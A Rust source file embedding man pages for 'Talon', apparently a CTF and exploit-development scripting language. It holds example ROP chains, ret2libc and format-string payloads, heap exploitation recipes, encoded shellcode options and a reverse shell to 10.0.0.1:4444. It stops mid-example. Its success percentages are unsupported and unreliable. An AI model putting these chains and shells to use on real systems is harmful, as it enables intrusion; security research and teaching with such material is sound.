pub struct ManPages;

impl ManPages {
    pub fn generate_all() -> Result<(), String> {
        std::fs::create_dir_all("man/man1")
            .map_err(|e| format!("Failed to create man directory: {}", e))?;

        Self::write_page("man/man1/talon.1", TALON_MAN)?;
        Self::write_page("man/man1/talon-rop.1", TALON_ROP_MAN)?;
        Self::write_page("man/man1/talon-shellcode.1", TALON_SHELLCODE_MAN)?;
        Self::write_page("man/man1/talon-exploit.1", TALON_EXPLOIT_MAN)?;
        Self::write_page("man/man1/talon-new.1", TALON_NEW_MAN)?;
        Self::write_page("man/man1/talon-db.1", TALON_DB_MAN)?;

        println!("Generated man pages in man/man1/");
        println!("Install with: sudo cp man/man1/* /usr/share/man/man1/");
        println!("View with: man talon");

        Ok(())
    }

    fn write_page(path: &str, content: &str) -> Result<(), String> {
        std::fs::write(path, content).map_err(|e| format!("Failed to write {}: {}", path, e))
    }

    pub fn display_page(topic: &str) {
        let content = match topic {
            "talon" => TALON_MAN,
            "talon-rop" => TALON_ROP_MAN,
            "talon-shellcode" => TALON_SHELLCODE_MAN,
            "talon-exploit" => TALON_EXPLOIT_MAN,
            "talon-new" => TALON_NEW_MAN,
            "talon-db" => TALON_DB_MAN,
            "talon-ctf" => TALON_CTF_MAN,
            "talon-diff-fuzz" => TALON_DIFF_FUZZ_MAN,
            "talon-taint" => TALON_TAINT_MAN,
            "talon-auto-rop" => TALON_AUTO_ROP_MAN,
            "talon-heap" => TALON_HEAP_MAN,
            "talon-kernel" => TALON_KERNEL_MAN,
            "talon-cve" => TALON_CVE_MAN,
            "talon-similarity" => TALON_SIMILARITY_MAN,
            "talon-chain" => TALON_CHAINING_MAN,
            "talon-safety" | "safety" => TALON_SAFETY_MAN,
            "talon-meta" | "meta" => TALON_META_MAN,
            "talon-reactive" | "reactive" => TALON_REACTIVE_MAN,
            "talon-event" | "event" => TALON_EVENT_MAN,
            "talon-probabilistic" | "probabilistic" => TALON_PROBABILISTIC_MAN,
            "talon-checkpoint" | "checkpoint" => TALON_CHECKPOINT_MAN,
            "talon-symbiotic" | "symbiotic" => TALON_SYMBIOTIC_MAN,
            "talon-goal-planner" | "goal-planner" => TALON_GOAL_PLANNER_MAN,
            "talon-strategy" | "strategy" => TALON_STRATEGY_MAN,
            "talon-speculative" | "speculative" => TALON_SPECULATIVE_MAN,
            "talon-vuln-forecast" | "vuln-forecast" => TALON_VULN_FORECAST_MAN,
            "talon-defense-sim" | "defense-sim" => TALON_DEFENSE_SIM_MAN,
            "talon-fractal" | "fractal" => TALON_FRACTAL_MAN,
            _ => return println!("No manual entry for {}", topic),
        };

        println!("{}", content);
    }
}

const TALON_MAN: &str = r#".TH TALON 1 "2026-01-09" "Talon 0.1.0" "Talon Manual"
.SH NAME
talon \- Domain-Specific Language for Binary Exploitation and Security Research

.SH SYNOPSIS
.B talon
[\fIOPTION\fR]... [\fICOMMAND\fR] [\fIFILE\fR]...

.SH DESCRIPTION
.B Talon
is a domain-specific scripting language for binary exploitation, CTF competitions, and security research. 
It provides structured syntax for common exploitation primitives including ROP chain building, shellcode 
generation, heap exploitation, and memory manipulation. Built on Rust for reliability, featuring integrated 
binary analysis (Capstone, goblin), constraint solving (Z3), and process memory access tools.

.SH OPTIONS
.TP
.BR \-h ", " \-\-help
Display help information and exit
.TP
.BR \-v ", " \-\-version
Display version information and exit
.TP
.BR \-V ", " \-\-verbose
Enable verbose output
.TP
.BR \-q ", " \-\-quiet
Suppress non-essential output
.TP
.BR \-\-no\-color
Disable colored output
.TP
.BR \-\-config " " \fIPATH\fR
Specify alternate configuration file

.SH COMMANDS
.TP
.B run \fIFILE\fR
Execute a Talon script file
.TP
.B repl
Start an interactive REPL (Read-Eval-Print Loop)
.TP
.B new \fITYPE\fR \fINAME\fR
Generate a new exploit template (buffer-overflow, rop, heap, etc.)
.TP
.B build \fIFILE\fR
Compile Talon script to native binary
.TP
.B wasm \fIFILE\fR
Compile Talon script to WebAssembly
.TP
.B analyze \fIBINARY\fR
Perform automated binary analysis and vulnerability detection
.TP
.B db search \fIQUERY\fR
Search the exploit database for CVEs and known exploits
.TP
.B db list
List all exploits in the database
.TP
.B config init
Create default configuration file
.TP
.B config show
Display current configuration
.TP
.B man \fITOPIC\fR
Display manual page for specified topic
.TP
.B quick-ref
Display quick reference card with common commands and patterns
.TP
.B completion \fISHELL\fR
Generate shell completion script (bash, zsh, fish)
.TP
.B ctf new_session \fINAME\fR
Create a new CTF session for tracking challenges
.TP
.B ctf add_challenge
Add a challenge to the current CTF session
.TP
.B ctf submit_flag
Submit a flag for a challenge
.TP
.B ctf show_stats
Display CTF session statistics and progress
.TP
.B diff_fuzz
Run differential fuzzing to discover vulnerabilities in patched binaries
.TP
.B taint_analysis
Perform taint analysis to detect information leaks
.TP
.B auto_rop
Automated ROP chain generation with constraint-based gadget solver

.SH CONFIGURATION
Talon reads configuration from ~/.config/talon/config.toml (Linux/macOS) or 
%APPDATA%\\talon\\config.toml (Windows). Configuration options include:

.TP
.B lm_studio_url
URL for LM Studio API (default: http://localhost:1234)
.TP
.B lm_studio_model
Model to use for code generation assistance
.TP
.B verbosity
Logging level: quiet, normal, verbose, debug
.TP
.B enable_colors
Enable/disable colored terminal output
.TP
.B enable_progress_bars
Show progress indicators for long operations
.TP
.B default_arch
Default target architecture (x86_64, x86, arm, aarch64)
.TP
.B default_os
Default target operating system (linux, windows, macos)

.SH EXAMPLES
.TP
Run a buffer overflow exploit:
.B talon run exploit.tal
.TP
Generate a ROP chain template:
.B talon new rop my_exploit
.TP
Start interactive shell:
.B talon repl
.TP
Analyze a binary for vulnerabilities:
.B talon analyze ./vulnerable_app
.TP
Search for a specific CVE:
.B talon db search CVE-2021-44228
.TP
Compile script to standalone binary:
.B talon build exploit.tal --static

.SH LANGUAGE FEATURES
.TP
.B Spread Operator
Unpack lists/arrays into new collections: let payload = [...header, ...body, ...footer]
.TP
.B Pipe Operator
Chain operations Unix-style: addr | p64 | send
.TP
.B Comments
Single-line: // comment
.br
Multi-line: /* comment */
.br
Shell-style: # comment
.TP
.B Variables
.B let
name = "value"
.br
.B const
MAX = 1024
.TP
.B Data Types
Numbers: 42, 0x41414141, -100
.br
Strings: "hello", """multi-line"""
.br
Booleans: true, false
.br
Lists: [1, 2, 3]
.br
Maps: {key: "value"}
.br
Bytes: 0xdeadbeef
.TP
.B Control Flow
if condition ... end
.br
for item in collection ... end
.br
match value case x: ... end
.TP
.B Networking
connect to "host" on port 1337
.br
send payload
.br
recv 1024
.br
interactive
.TP
.B Binary Operations
p64(0x401000) - Pack 64-bit little-endian
.br
u64(data) - Unpack 64-bit little-endian
.br
cyclic(100) - Generate De Bruijn sequence
.br
cyclic_find(pattern, value)
.TP
.B ROP Chains
resolve rop chain in "binary"
.br
find_rop_gadget("binary", "pop rdi; ret")
.br
elf_symbol("binary", "main", "symbol")
.TP
.B Shellcode
generate_shellcode(reverse_shell, lhost="10.0.0.1", lport=4444)
.br
encode_alphanumeric(shellcode)
.br
assemble syscall "..." for linux
.TP
.B AI & Automation
auto_exploit "binary" ... end
.br
symbolic let x = bytes(32) ... end
.br
audit solidity "contract.sol" ... end
.TP
.B Debugging
debug attach "process" ... end
.br
breakpoint at 0x401000
.br
watchpoint write 0x601040

.SH EXPLOIT DEVELOPMENT WORKFLOW
.TP
.B 1. Target Analysis
.B talon analyze target_binary
.br
Automatically detects architecture, protections (NX, ASLR, canary, RELRO), and potential vulnerabilities.
.TP
.B 2. Template Generation
.B talon new buffer-overflow exploit
.br
Creates a pre-configured exploit template with boilerplate code.
.TP
.B 3. Development
Edit exploit.tal with your favorite editor. Talon provides syntax highlighting for VS Code, Vim, Emacs.
.TP
.B 4. Testing
.B talon run exploit.tal --verbose
.br
Test exploit in controlled environment with detailed logging.
.TP
.B 5. Deployment
.B talon build exploit.tal --static
.br
Compile to standalone binary for deployment.

.SH SECURITY FEATURES
.TP
.B Symbolic Execution
Automatically discover inputs that reach specific code paths using Z3 solver.
.TP
.B Protocol Fuzzing
Grammar-based coverage-guided fuzzing with crash triage.
.TP
.B Heap Feng Shui
Automated heap layout manipulation for UAF and heap overflow exploits.
.TP
.B Kernel Exploitation
Built-in primitives for Linux kernel privilege escalation.
.TP
.B Smart Contract Auditing
Detect reentrancy, integer overflow, and other Solidity vulnerabilities.
.TP
.B Cloud Exploitation
SSRF attacks against AWS/GCP/Azure metadata services.
.TP
.B Container Escape
Automated Docker/Kubernetes escape techniques.

.SH FILES
.TP
.I ~/.config/talon/config.toml
User configuration file
.TP
.I /usr/share/talon/templates/
Built-in exploit templates
.TP
.I /usr/share/talon/stdlib/
Standard library modules

.SH ENVIRONMENT
.TP
.B TALON_CONFIG
Override default configuration file path
.TP
.B TALON_LOG_LEVEL
Set logging level (error, warn, info, debug, trace)
.TP
.B TALON_NO_COLOR
Disable colored output when set
.TP
.B LM_STUDIO_URL
Override LM Studio API endpoint

.SH SEE ALSO
.BR talon-rop (1),
.BR talon-shellcode (1),
.BR talon-exploit (1),
.BR talon-new (1),
.BR talon-db (1)

.SH BUGS
Report bugs at: https://github.com/talon-lang/talon/issues

.SH AUTHOR
Talon Development Team

.SH COPYRIGHT
Copyright \(co 2026 Talon Project. Licensed under MIT License.
"#;

const TALON_ROP_MAN: &str = r#".TH TALON-ROP 1 "2026-01-07" "Talon 0.1.0" "Talon Manual"
.SH NAME
talon-rop \- Return-Oriented Programming utilities in Talon

.SH SYNOPSIS
.B resolve rop chain in
.I BINARY

.SH DESCRIPTION
Talon provides comprehensive ROP (Return-Oriented Programming) gadget searching and 
chain construction capabilities. It can automatically find useful gadgets, score them 
by quality, and construct complete ROP chains for various objectives.

.SH FUNCTIONS
.TP
.B find_rop_gadget(binary, pattern)
Search for ROP gadgets matching the given pattern.
.br
Example: find_rop_gadget("./binary", "pop rdi; ret")
.TP
.B resolve rop chain in "binary"
Automatically find all useful gadgets in a binary
.TP
.B elf_symbol(binary, name, type)
Resolve symbol addresses (symbol, plt, got)
.br
Example: elf_symbol("binary", "puts", "plt")
.TP
.B gadget_quality(gadget)
Score gadget by quality (0-100)

.SH GADGET PATTERNS
.TP
.B Stack Pivoting
pop rsp; ret
.br
leave; ret
.br
xchg rax, rsp; ret
.TP
.B Register Control
pop rdi; ret (1st argument)
.br
pop rsi; ret (2nd argument)
.br
pop rdx; ret (3rd argument)
.br
pop rax; ret (syscall number)
.TP
.B Memory Operations
mov [rdi], rsi; ret
.br
mov rax, [rdi]; ret
.br
xchg rax, rdi; ret
.TP
.B Arithmetic
add rax, rdi; ret
.br
xor rax, rax; ret
.br
inc rax; ret
.TP
.B Syscalls
syscall; ret
.br
int 0x80; ret

.SH EXAMPLES
.TP
Basic ret2libc:
.nf
let puts_plt = elf_symbol("binary", "puts", "plt")
let puts_got = elf_symbol("binary", "puts", "got")
let pop_rdi = find_rop_gadget("binary", "pop rdi; ret")

let leak_chain = [
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(main_addr)
]

send cyclic(offset) + leak_chain
let leak = u64(recv(8))
let libc_base = leak - 0x80e50
.fi

.TP
Advanced ROP chain with multiple gadgets:
.nf
resolve rop chain in "./target"

let pop_rdi = find_rop_gadget("target", "pop rdi; ret")
let pop_rsi = find_rop_gadget("target", "pop rsi; ret")
let pop_rdx = find_rop_gadget("target", "pop rdx; ret")
let pop_rax = find_rop_gadget("target", "pop rax; ret")
let syscall = find_rop_gadget("target", "syscall")

// execve("/bin/sh", NULL, NULL)
let rop = [
    p64(pop_rax), p64(59),           // rax = execve
    p64(pop_rdi), p64(binsh_addr),   // rdi = "/bin/sh"
    p64(pop_rsi), p64(0),            // rsi = NULL
    p64(pop_rdx), p64(0),            // rdx = NULL
    p64(syscall)                     // syscall
]
.fi

.SH AUTOMATIC ROP CHAIN GENERATION
Talon can automatically construct ROP chains:
.nf
auto_exploit "binary"
    objective: "shell"
    method: "rop"
end
.fi

This will:
1. Analyze binary for gadgets
2. Find libc leaks if needed
3. Construct optimal ROP chain
4. Generate complete exploit

.SH SEE ALSO
.BR talon (1),
.BR talon-exploit (1),
.BR talon-shellcode (1)
"#;

const TALON_SHELLCODE_MAN: &str = r#".TH TALON-SHELLCODE 1 "2026-01-07" "Talon 0.1.0" "Talon Manual"
.SH NAME
talon-shellcode \- Shellcode generation and encoding in Talon

.SH SYNOPSIS
.B generate_shellcode(\fITYPE\fR, \fIOPTIONS\fR...)

.SH DESCRIPTION
Talon provides built-in shellcode generation for various payloads, automatic encoding 
to bypass filters, and cross-architecture shellcode translation.

.SH SHELLCODE TYPES
.TP
.B reverse_shell
Reverse TCP shell
.br
Options: lhost, lport
.TP
.B bind_shell
Bind TCP shell
.br
Options: lport
.TP
.B execute
Execute arbitrary command
.br
Options: cmd
.TP
.B read_flag
Read file and exfiltrate
.br
Options: file, server, port
.TP
.B download_exec
Download and execute payload
.br
Options: url

.SH ENCODING METHODS
.TP
.B encode_alphanumeric(shellcode)
Encode shellcode to alphanumeric characters only
.TP
.B encode_unicode(shellcode)
Unicode encoding for filter bypass
.TP
.B encode_xor(shellcode, key)
XOR encoding with custom key
.TP
.B encode_ascii_printable(shellcode)
Encode to printable ASCII only

.SH EXAMPLES
.TP
Generate reverse shell:
.nf
let sc = generate_shellcode(reverse_shell, 
                           lhost="10.0.0.1", 
                           lport=4444)
.fi

.TP
Alphanumeric encoded payload:
.nf
let raw_sc = generate_shellcode(execute, cmd="/bin/sh")
let encoded = encode_alphanumeric(raw_sc)
.fi

.TP
Custom assembly:
.nf
assemble syscall "
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    lea rdi, [rip + binsh]
    syscall
binsh:
    .string \\"/bin/sh\\"
" for linux
.fi

.SH CROSS-ARCHITECTURE
.TP
Translate shellcode between architectures:
.nf
translate shellcode from x86 to arm
    shellcode: raw_bytes
    optimize: true
end
.fi

.SH SHELLCODE DATABASE
Access pre-built shellcode:
.nf
let sc = shellcode_db_get("linux/x64/exec")
.fi

Available shellcode:
- linux/x64/exec
- linux/x64/reverse_tcp
- linux/x64/bind_tcp
- linux/x86/exec
- linux/arm/exec
- windows/x64/exec
- windows/x64/reverse_tcp

.SH SEE ALSO
.BR talon (1),
.BR talon-rop (1),
.BR talon-exploit (1)
"#;

const TALON_EXPLOIT_MAN: &str = r#".TH TALON-EXPLOIT 1 "2026-01-07" "Talon 0.1.0" "Talon Manual"
.SH NAME
talon-exploit \- Exploit development patterns and techniques

.SH DESCRIPTION
Comprehensive guide to exploit development in Talon, covering common vulnerability 
classes and exploitation techniques.

.SH BUFFER OVERFLOW
.TP
.B Stack Buffer Overflow
.nf
let pattern = cyclic(500)
// Find offset from crash
let offset = cyclic_find(pattern, crash_addr)

let payload = "A" * offset
payload = payload + p64(ret_addr)
payload = payload + shellcode
.fi

.SH RETURN TO LIBC
.TP
.B Leak libc base and return to system()
.nf
// Stage 1: Leak
send cyclic(offset) + p64(pop_rdi) + p64(puts_got) + 
     p64(puts_plt) + p64(main)
     
let leak = u64(recv(8))
let libc_base = leak - libc_puts_offset

// Stage 2: Execute
let system = libc_base + libc_system_offset
let binsh = libc_base + libc_binsh_offset

send cyclic(offset) + p64(pop_rdi) + p64(binsh) + 
     p64(system)
.fi

.SH FORMAT STRING
.TP
.B Arbitrary write via format string
.nf
let target = 0x601040  // GOT entry
let value = 0x401337   // win function

let offset = find_format_offset("binary", 20)
let payload = p64(target) + p64(target + 2)
payload = payload + "%{}c%{}$hn".format(value & 0xffff, offset)
.fi

.SH HEAP EXPLOITATION
.TP
.B Tcache Poisoning
.nf
// Allocate chunks
allocate(0, 0x100)
allocate(1, 0x100)

// Free to populate tcache
free(0)
free(1)

// Overflow into tcache metadata
allocate(2, overflow_payload)

// Next allocation returns arbitrary address
allocate(3, 0x100)  // Returns target_addr
.fi

.TP
.B Use-After-Free
.nf
allocate_object(0, 0x100)
free_object(0)

// Spray heap
for i in 0..20
    allocate_object(i + 1, fake_vtable)
end

// Trigger UAF
use_object(0)  // Uses our fake vtable
.fi

.SH KERNEL EXPLOITATION
.TP
.B Privilege Escalation
.nf
kernel_exploit
    leak_method: "auto"
    spray_target: "physmap"
    escalation: "root"
end
.fi

.SH SMART CONTRACTS
.TP
.B Reentrancy Attack
.nf
audit solidity "VulnerableBank.sol"
    detect: ["reentrancy"]
    auto_exploit: true
end
.fi

.SH SEE ALSO
.BR talon (1),
.BR talon-rop (1),
.BR talon-shellcode (1)
"#;

const TALON_NEW_MAN: &str = r#".TH TALON-NEW 1 "2026-01-07" "Talon 0.1.0" "Talon Manual"
.SH NAME
talon-new \- Generate exploit templates

.SH SYNOPSIS
.B talon new
.I TYPE NAME

.SH DESCRIPTION
Generate pre-configured exploit templates for common vulnerability classes.

.SH TEMPLATE TYPES
.TP
.B buffer-overflow
Classic stack buffer overflow
.TP
.B rop
Return-Oriented Programming
.TP
.B format-string
Format string vulnerability
.TP
.B heap
Heap exploitation (tcache, fastbin)
.TP
.B kernel
Linux kernel privilege escalation
.TP
.B ret2libc
Return to libc attack
.TP
.B ret2csu
Return-to-CSU gadget exploitation
.TP
.B fsop
File Stream Oriented Programming
.TP
.B srop
Sigreturn-Oriented Programming
.TP
.B house-of-force
House of Force heap exploitation
.TP
.B off-by-one
Off-by-one overflow exploitation
.TP
.B use-after-free
UAF heap exploitation
.TP
.B race-condition
TOCTOU exploitation
.TP
.B shellcode
Custom shellcode development
.TP
.B web-sqli
SQL injection
.TP
.B smart-contract
Solidity contract auditing
.TP
.B basic
Basic script structure

.SH EXAMPLES
.TP
Generate buffer overflow template:
.B talon new buffer-overflow my_exploit
.TP
Generate ROP template:
.B talon new rop rop_exploit
.TP
List available templates:
.B talon new --list

.SH SEE ALSO
.BR talon (1),
.BR talon-exploit (1)
"#;

const TALON_DB_MAN: &str = r#".TH TALON-DB 1 "2026-01-07" "Talon 0.1.0" "Talon Manual"
.SH NAME
talon-db \- Exploit database queries

.SH SYNOPSIS
.B talon db
.I COMMAND

.SH COMMANDS
.TP
.B search \fIQUERY\fR
Search for exploits by CVE, keyword, or description
.TP
.B list
List all exploits in database
.TP
.B show \fICVE-ID\fR
Display detailed information about specific CVE
.TP
.B type \fITYPE\fR
List exploits by type (rce, privesc, info-disclosure)
.TP
.B platform \fIPLATFORM\fR
List exploits by platform (linux, windows, macos)

.SH EXAMPLES
.TP
Search for Log4j:
.B talon db search log4j
.TP
Show CVE details:
.B talon db show CVE-2021-44228
.TP
List RCE exploits:
.B talon db type rce
.TP
List Windows exploits:
.B talon db platform windows

.SH DATABASE ENTRIES
The database includes:
- CVE-2021-44228 (Log4j)
- CVE-2014-0160 (Heartbleed)
- CVE-2017-0144 (EternalBlue)
- CVE-2016-5195 (Dirty COW)
- CVE-2021-3156 (Baron Samedit)

.SH SEE ALSO
.BR talon (1),
.BR talon-exploit (1)
"#;

const TALON_CTF_MAN: &str = r#".TH TALON-CTF 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-ctf - CTF session management
.SH SEE ALSO
.BR talon (1)
"#;

const TALON_DIFF_FUZZ_MAN: &str = r#".TH TALON-DIFF-FUZZ 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-diff-fuzz - Differential fuzzing
.SH SEE ALSO
.BR talon (1)
"#;

const TALON_TAINT_MAN: &str = r#".TH TALON-TAINT 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-taint - Taint analysis for information leak detection

.SH SYNOPSIS
.B taint_analysis
.I binary_path

.SH DESCRIPTION
The
.B taint_analysis
command performs dynamic taint tracking to detect information leaks in binaries.
It monitors user-controlled data flow from various sources (stdin, files, network) to
sinks (stdout, stderr, sockets, file writes) and automatically detects leaked sensitive
information such as stack addresses, heap addresses, stack canaries, PIE base addresses,
and libc base addresses.

.SH DSL SYNTAX
.nf
taint_analysis "./binary_path"
    source: stdin
    
    track_to:
        - stdout
        - stderr
        - socket:<address>
        - file_write:<path>
    end
    
    alert_on:
        - stack_address_leak
        - heap_address_leak
        - canary_leak
        - pie_base_leak
        - libc_base_leak
        - generic_info_leak
    end
end
.fi

.SH PARAMETERS
.TP
.B binary
Path to the target binary to analyze
.TP
.B source
Taint source (currently: stdin)
.TP
.B track_to
List of sinks to monitor for tainted data:
.RS
.IP \(bu 2
stdout - Standard output stream
.IP \(bu 2
stderr - Standard error stream
.IP \(bu 2
socket:<address> - Network socket (e.g., socket:127.0.0.1:1337)
.IP \(bu 2
file_write:<path> - File write operations (e.g., file_write:/tmp/leak.log)
.RE
.TP
.B alert_on
Types of leaks to detect:
.RS
.IP \(bu 2
stack_address_leak - Stack pointer/frame pointer leaks (Critical)
.IP \(bu 2
heap_address_leak - Heap memory address leaks (High)
.IP \(bu 2
canary_leak - Stack canary value leaks (Critical)
.IP \(bu 2
pie_base_leak - PIE/ASLR base address leaks (High)
.IP \(bu 2
libc_base_leak - Libc base address leaks (Critical)
.IP \(bu 2
generic_info_leak - Other information disclosure (Low/Medium)
.RE

.SH OUTPUT
The tool generates multiple output files:
.TP
.B taint_leak_<binary>_<testid>.txt
Detailed leak reports for each test case containing:
.RS
.IP \(bu 2
Leak type and severity
.IP \(bu 2
Exploitability score (0-100)
.IP \(bu 2
Sink where leak was detected
.IP \(bu 2
Leaked value (hexadecimal)
.IP \(bu 2
Tainted byte offsets
.RE

.SH EXAMPLES
.TP
.B Basic taint analysis
.nf
taint_analysis "./vuln_app"
    source: stdin
    track_to:
        - stdout
    end
    alert_on:
        - stack_address_leak
        - heap_address_leak
    end
end
.fi

.TP
.B Comprehensive leak detection
.nf
taint_analysis "./server_app"
    source: stdin
    track_to:
        - stdout
        - stderr
        - socket:127.0.0.1:8080
    end
    alert_on:
        - stack_address_leak
        - heap_address_leak
        - canary_leak
        - pie_base_leak
        - libc_base_leak
    end
end
.fi

.SH USE CASES
.TP
.B Format String Vulnerabilities
Detect address leaks from printf-family functions
.TP
.B Uninitialized Memory
Find stack/heap data disclosed through uninitialized buffers
.TP
.B ASLR Bypass Primitives
Identify information leaks that can defeat ASLR/PIE
.TP
.B Canary Bypass
Discover stack canary value disclosures

.SH SEE ALSO
.BR talon (1),
.BR talon-diff-fuzz (1)
"#;

const TALON_AUTO_ROP_MAN: &str = r#".TH TALON-AUTO-ROP 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-auto-rop - Automated ROP chain generation with AI-powered gadget solver

.SH SYNOPSIS
.B auto_rop
.I binary_path

.SH DESCRIPTION
The
.B auto_rop
command provides intelligent, automated ROP (Return-Oriented Programming) chain generation.
Simply describe your exploitation goal (e.g., "system('/bin/sh')"), specify constraints
(e.g., no null bytes), and prefer certain strategies (e.g., one-gadget, ret2libc).
The solver automatically finds gadgets, builds chains, validates constraints, and generates
working payloads with exploitability scoring.

.SH DSL SYNTAX
.nf
auto_rop "./binary"
    goal: system("/bin/sh")
    
    libc: "/path/to/libc.so.6"
    libc_base: 0x7ffff7a00000
    
    constraints:
        - no_nulls
        - max_length:200
        - preserve_rbp
    end
    
    prefer:
        - one_gadget
        - ret2libc
        - mprotect_rwx
    end
end
.fi

.SH PARAMETERS
.TP
.B binary
Path to the target binary
.TP
.B goal
Exploitation goal (system, execve, mprotect_rwx, custom)
.RS
.IP \(bu 2
system("/bin/sh") - Spawn shell via system()
.IP \(bu 2
execve("/bin/sh") - Spawn shell via execve syscall
.IP \(bu 2
mprotect_rwx - Make memory page RWX
.RE
.TP
.B libc (optional)
Path to libc shared library
.TP
.B libc_base (optional)
Base address of libc in memory (for ASLR bypass)
.TP
.B constraints
List of constraints the ROP chain must satisfy:
.RS
.IP \(bu 2
no_nulls - Avoid null bytes (for strcpy vulnerabilities)
.IP \(bu 2
alphanumeric - Only ASCII alphanumeric bytes
.IP \(bu 2
max_length:N - Limit payload to N bytes
.IP \(bu 2
preserve_rbp - Keep RBP register unchanged
.RE
.TP
.B prefer
Preferred exploitation strategies (tried in order):
.RS
.IP \(bu 2
one_gadget - Single gadget that spawns shell (95% success)
.IP \(bu 2
ret2libc - Classic system('/bin/sh') (90% success)
.IP \(bu 2
mprotect_rwx - Make page executable + shellcode (85% success)
.IP \(bu 2
ret2syscall - Direct syscall(59, "/bin/sh", ...) (88% success)
.IP \(bu 2
srop - Sigreturn-Oriented Programming (75% success)
.IP \(bu 2
jop - Jump-Oriented Programming (70% success)
.IP \(bu 2
cop - Call-Oriented Programming (68% success)
.IP \(bu 2
stack_pivot - Pivot stack to controlled region (82% success)
.RE

.SH OUTPUT
The tool generates two output files:
.TP
.B rop_solution.json
Complete solution details including:
.RS
.IP \(bu 2
Strategy used
.IP \(bu 2
Full ROP chain (addresses)
.IP \(bu 2
Gadget details with purposes
.IP \(bu 2
Success probability
.IP \(bu 2
Constraint validation results
.RE
.TP
.B rop_payload.bin
Binary payload ready to use in exploit

.SH EXAMPLES
.TP
.B Basic ret2libc
.nf
auto_rop "./vuln"
    goal: system("/bin/sh")
    prefer:
        - ret2libc
    end
end
.fi

.TP
.B Constrained ROP (no null bytes)
.nf
auto_rop "./vuln"
    goal: system("/bin/sh")
    
    libc: "/lib/x86_64-linux-gnu/libc.so.6"
    libc_base: 0x7ffff7a00000
    
    constraints:
        - no_nulls
        - max_length:200
    end
    
    prefer:
        - one_gadget
        - ret2libc
    end
end
.fi

.TP
.B SROP exploitation
.nf
auto_rop "./vuln"
    goal: execve("/bin/sh")
    prefer:
        - srop
    end
end
.fi

.SH FEATURES
.TP
.B Intelligent Gadget Database
Automatically scans binary and libc for all available gadgets
.TP
.B Multi-Strategy Solver
Tries multiple exploitation strategies until one succeeds
.TP
.B Constraint Validation
Ensures generated chains satisfy all constraints
.TP
.B One-Gadget Detection
Finds magic gadgets that spawn shells with minimal setup
.TP
.B Stack Pivot Analysis
Detects gadgets suitable for stack pivoting
.TP
.B Exploitability Scoring
Provides success probability (0-100%) for each solution

.SH ADVANCED TECHNIQUES
.TP
.B SROP (Sigreturn-Oriented Programming)
Full control over all registers via rt_sigreturn syscall
.TP
.B JOP/COP
Alternative to ROP using indirect jumps/calls
.TP
.B Stack Pivoting
Move stack pointer to attacker-controlled region

.SH SEE ALSO
.BR talon (1),
.BR talon-rop (1)
"#;

const TALON_HEAP_MAN: &str = r#".TH TALON-HEAP 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-heap - Modern heap exploitation framework for glibc 2.23 - 2.39+

.SH SYNOPSIS
.B heap_exploit
.I binary_path

.SH DESCRIPTION
The
.B heap_exploit
command provides best-in-class heap exploitation capabilities for modern glibc versions,
including advanced bypass techniques for safe-linking (glibc 2.32+) and tcache key
validation (glibc 2.35+). Supports classic and modern heap techniques including
House of IO, House of Apple, and largebin attacks.

.SH DSL SYNTAX
.nf
heap_exploit "./binary"
    glibc_version: "2.35"
    
    technique: tcache_poisoning
    bypass: safe_linking
    
    target: __free_hook
    overwrite_with: system
    
    heap_base: 0x0000555555554000
    libc_base: 0x00007ffff7a00000
end
.fi

.SH PARAMETERS
.TP
.B binary
Path to target binary

.TP
.B glibc_version
Target glibc version (2.23, 2.27, 2.31, 2.32, 2.35, 2.36, 2.37, 2.38, 2.39)

.TP
.B technique
Heap exploitation technique:
.RS
.IP \(bu 2
tcache_poisoning - Tcache poisoning attack (glibc 2.27+)
.IP \(bu 2
fastbin_attack - Fastbin dup/corruption
.IP \(bu 2
unsorted_bin_attack - Write large value to arbitrary location
.IP \(bu 2
largebin_attack - Exploit unsorted→large bin transition
.IP \(bu 2
house_of_force - Top chunk size corruption
.IP \(bu 2
house_of_spirit - Fake chunk on stack
.IP \(bu 2
house_of_io - FILE structure exploitation
.IP \(bu 2
house_of_apple - Modern _IO_wfile_overflow (glibc 2.35+)
.IP \(bu 2
house_of_orange - Unsorted bin + FILE attack
.RE

.TP
.B bypass (optional)
Protection bypass technique:
.RS
.IP \(bu 2
safe_linking - Bypass safe-linking XOR mangling (glibc 2.32+)
.IP \(bu 2
tcache_key - Bypass tcache key validation (glibc 2.35+)
.RE

.TP
.B target
Target address to overwrite:
.RS
.IP \(bu 2
__malloc_hook - Malloc hook (deprecated in glibc 2.34+)
.IP \(bu 2
__free_hook - Free hook (deprecated in glibc 2.34+)
.IP \(bu 2
__realloc_hook - Realloc hook (deprecated in glibc 2.34+)
.IP \(bu 2
_io_list_all - IO list (modern glibc 2.35+)
.IP \(bu 2
0x... - Arbitrary hex address
.RE

.TP
.B overwrite_with
Value to write to target:
.RS
.IP \(bu 2
system - Address of system() function
.IP \(bu 2
0x... - Arbitrary hex value
.RE

.TP
.B heap_base (optional)
Heap base address (required for safe-linking bypass)

.TP
.B libc_base (optional)
Libc base address (required for hook targets)

.SH OUTPUT FILES
.TP
.B heap_exploit.json
Complete exploitation solution with:
.RS
.IP \(bu 2
Technique details
.IP \(bu 2
Glibc version
.IP \(bu 2
Target address
.IP \(bu 2
Payload bytes (base64 encoded)
.IP \(bu 2
Step-by-step exploitation guide
.IP \(bu 2
Success probability
.IP \(bu 2
Constraints and requirements
.RE

.TP
.B heap_exploit_payload.bin
Binary payload ready for injection

.SH EXAMPLES

.SS Example 1: Tcache Poisoning with Safe-Linking Bypass (glibc 2.35)
.nf
heap_exploit "./vuln"
    glibc_version: "2.35"
    technique: tcache_poisoning
    bypass: safe_linking
    target: __free_hook
    overwrite_with: system
    heap_base: 0x0000555555554000
    libc_base: 0x00007ffff7a00000
end
.fi

.SS Example 2: House of Apple (Modern FILE Exploitation)
.nf
heap_exploit "./modern_vuln"
    glibc_version: "2.37"
    technique: house_of_apple
    target: _io_list_all
    overwrite_with: system
    heap_base: 0x0000555555554000
    libc_base: 0x00007ffff7a00000
end
.fi

.SS Example 3: Largebin Attack
.nf
heap_exploit "./largebin_vuln"
    glibc_version: "2.35"
    technique: largebin_attack
    target: 0x0000555555558000
    overwrite_with: 0x0000555555559000
